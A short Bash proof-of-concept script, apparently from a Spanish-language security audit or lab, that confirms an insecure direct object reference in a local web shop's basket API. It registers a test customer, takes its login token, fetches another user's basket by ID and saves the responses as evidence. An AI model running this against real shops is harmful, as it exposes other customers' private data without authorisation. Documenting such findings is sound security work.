#!/usr/bin/env bash
# V-04 · IDOR de carrito: un customer lee el carrito de otro usuario (routes/basket.ts:19, sin check de dueño)
set -uo pipefail
BASE_URL="${BASE_URL:-http://127.0.0.1:3000}"
HERE="$(cd "$(dirname "$0")" && pwd)"; EVID="${EVID:-$HERE/../../evidencias/h2-V-04-idor-basket}"; mkdir -p "$EVID"
TARGET_BASKET="${TARGET_BASKET:-1}"
echo "[$(TZ=America/Guatemala date '+%Y-%m-%d %H:%M:%S %Z')] V-04 IDOR basket -> $BASE_URL"
TS=$(date +%s); EMAIL="idor.$TS@example.com"
printf '{"email":"%s","password":"Passw0rd!","passwordRepeat":"Passw0rd!","securityQuestion":{"id":1},"securityAnswer":"x"}' "$EMAIL" > "$EVID/registro.json"
curl -s -X POST "$BASE_URL/api/Users/" -H 'Content-Type: application/json' --data @"$EVID/registro.json" -o "$EVID/registro-resp.json" >/dev/null
printf '{"email":"%s","password":"Passw0rd!"}' "$EMAIL" > "$EVID/login.json"
curl -s -X POST "$BASE_URL/rest/user/login" -H 'Content-Type: application/json' --data @"$EVID/login.json" -o "$EVID/login-resp.json" >/dev/null
CTOK=$(python3 -c "import json;print(json.load(open('$EVID/login-resp.json'))['authentication']['token'])")
MYBID=$(python3 -c "import json;print(json.load(open('$EVID/login-resp.json'))['authentication']['bid'])")
echo "cliente nuevo $EMAIL -> carrito propio bid=$MYBID"
HTTP=$(curl -s "$BASE_URL/rest/basket/$TARGET_BASKET" -H "Authorization: Bearer $CTOK" -o "$EVID/basket-ajeno.json" -w '%{http_code}')
echo "GET /rest/basket/$TARGET_BASKET con MI token -> HTTP $HTTP"; echo "$HTTP" > "$EVID/http_code.txt"
OWNER=$(python3 -c "import json;print(json.load(open('$EVID/basket-ajeno.json'))['data'].get('UserId'))")
echo "PASS: carrito $TARGET_BASKET (dueño UserId=$OWNER) devuelto a un customer cuyo carrito es $MYBID"
[ "$TARGET_BASKET" != "$MYBID" ] && echo "VULN CONFIRMADA (V-04): acceso a carrito ajeno (IDOR), sin verificación de propietario"
